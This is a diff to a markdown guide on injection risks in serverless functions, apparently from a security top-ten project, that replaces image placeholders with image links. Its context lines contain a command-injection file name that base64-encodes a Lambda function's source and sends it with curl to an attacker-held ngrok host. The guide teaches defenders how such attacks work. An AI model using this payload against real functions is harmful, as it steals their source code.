@@ -25,7 +25,7 @@ The impact of a successful injection attack will lean on the permission the vuln
 
 ## Example Attack Scenario I
 The following function code, repeatedly found in the wild, deserializes data using the eval() function:
-<image>
+![injection-1](images/0x01injection-1.png)
 
 The untrusted input is sent from the trigger’s event to the unserialize function without any validation. By sending the following payload, attackers can steal the source code of the function, simply by creating a new child_proccess that will zip the source-code found in the current directory, wrapping it up with base64 and sending it to any server they have access to:
 >
@@ -43,7 +43,7 @@ The attacker can now investigate the code and use it to create a more cloud-nati
 ## Example Attack Scenario II
 A function is triggered from a storage file upload. The function then downloads the file and processes it.
 
-<image> 
+![injection-2](images/0x01injection-2.png)
 
 However, the the function is vulnerable to command injection, in case a downloaded file does not end with the required file extension (i.e. ​ .jpg ​ ).
 
@@ -51,7 +51,7 @@ To exploit that, an attacker uses the application legitimately, but uploads two 
 >
     chip.gif c.jpg;cd ..; cd var;cd task;f=`head -50 lambda_function.py|base64 --wrap=0`;curl
     protego.ngrok.io?l="$f"
-<iamge>
+![injection-3](images/0x01injection-3.png)
 
 To exploit this vulnerability, the attacker needed to:
 
@@ -63,9 +63,8 @@ To exploit this vulnerability, the attacker needed to:
 - Send it to a destination held by the attacker
 
 As a result of the Lambda execution, a request is sent to the attacker, containing the function’s code:
-<image>
-<image>
+![injection-4](images/0x01injection-4.png)
+![injection-5](images/0x01injection-5.png)
 
 ## Serverless Risk Meter
 Injection attacks are always a great risk. One major benefit is that serverless APIs are harder for attackers to scan than traditional HTTP apps, which raises the bar dramatically for automated attacks. However, knowing that 99% of possible malicious inputs are coming from API calls in traditional server applications, allowing us to put all our guard there, makes it at least more predictable. The increase in attack surface, results in a major security concern in serverless applications.
-<image>
